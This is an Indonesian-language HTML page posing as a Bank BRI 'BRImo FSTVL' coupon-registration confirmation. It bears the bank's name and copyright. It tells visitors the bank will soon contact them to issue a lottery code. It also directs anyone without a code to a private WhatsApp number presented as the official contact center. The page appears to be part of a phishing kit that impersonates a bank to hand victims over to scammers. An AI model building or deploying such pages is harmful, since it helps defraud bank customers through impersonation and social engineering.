<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BRImo FSTVL</title>
  <!-- Bootstrap CSS -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />
  <!-- Google Fonts: Poppins -->
  <link
    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <!-- SweetAlert2 -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    /* Latar belakang halaman */
    body {
      background: linear-gradient(135deg, #e9f0f7, #f8f9fa);
      font-family: "Poppins", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }

    /* Container utama */
    .container {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      width: 100%;
      padding: 30px;
      text-align: center;
    }

    .header img {
      max-width: 100%;
      margin-bottom: 15px;
    }

    .img-fluid {
      margin-bottom: 15px;
      border-radius: 8px;
      max-height: 300px;
      object-fit: cover;
    }

    /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
    .message {
      background: linear-gradient(135deg, #004080, #0059b3);
      color: #fff;
      padding: 15px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 20px;
      position: relative;
      min-height: 120px; /* Bisa disesuaikan */
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Area tempat teks diketik satu per satu */
    .typingText {
      white-space: pre-line; /* Agar bisa multiline */
      text-align: center;
      width: 100%;
      padding: 0 10px;
    }

    .footer {
      font-size: 14px;
      color: #0059b3;
      margin-top: 10px;
    }

    /* Custom styling untuk SweetAlert2 pop-up */
    .swal2-border-radius {
      border-radius: 12px !important;
    }
  </style>
</head>
<body onload="initPage()">
  <div class="container">
    <div class="header">
      <img src="img/atas.png" alt="Logo" style="height: 70px" />
    </div>
    <img src="img/1.png" alt="Ilustrasi Pelanggan" class="img-fluid" />

    <!-- Kotak pesan dengan efek ketik (typewriter) -->
    <div class="message">
      <div id="typingContainer" class="typingText"></div>
    </div>
    
           <div>
   <b> <p onclick="location.href='https://wa.me/6285169990334?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Tidak Terima Kode ?<br>
         <span style="color: #098CE3">Hubungi Contact Center</span>
         </strong></p></b>

    <div class="footer">
      &copy; 2025 PT Bank Rakyat Indonesia Tbk.
    </div>
  </div>

  <audio id="thankYouAudio" src="img/music.mp3"></audio>

  <script>
    // Teks yang akan ditampilkan dengan efek ketik
    const typewriterText = `Terimakasih Telah Mendaftar Dilayanan Bank BRI Festival.
Pendaftaran Anda Sedang Diproses. Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank BRI
Untuk Proses Cetak Kode Kupon Undian Anda.`;

    // Fungsi untuk memutar audio dengan jeda 1 detik
    function playAudio() {
      const audio = document.getElementById("thankYouAudio");
      setTimeout(() => {
        const playPromise = audio.play();
        if (playPromise !== undefined) {
          playPromise.catch((error) => {
            document.body.addEventListener(
              "click",
              () => {
                audio.play();
              },
              { once: true }
            );
          });
        }
      }, 1000);
    }

    // SweetAlert2 pop-up
    function showThankYouAlert() {
      Swal.fire({
        title: "Registrasi Kupon Berhasil !",
        text: "Untuk Info Lebih Lanjut. Anda akan di hubungi Call Center BRImo FSTVL", 
        icon: "success",
        confirmButtonText: "OK",
        confirmButtonColor: "#004080",
        customClass: {
          popup: "swal2-border-radius",
        },
      });
    }

    // Efek ketik satu per satu huruf
    function typeWriterEffect(text, containerId, speed = 40) {
      let index = 0;
      const container = document.getElementById(containerId);

      function typeChar() {
        if (index < text.length) {
          container.innerHTML += text.charAt(index);
          index++;
          setTimeout(typeChar, speed);
        }
      }
      typeChar();
    }

    // Fungsi inisialisasi saat halaman di-load
    function initPage() {
      playAudio();
      showThankYouAlert();
      typeWriterEffect(typewriterText, "typingContainer", 40); // kecepatan 40 ms per huruf
    }
  </script>
</body>
</html>
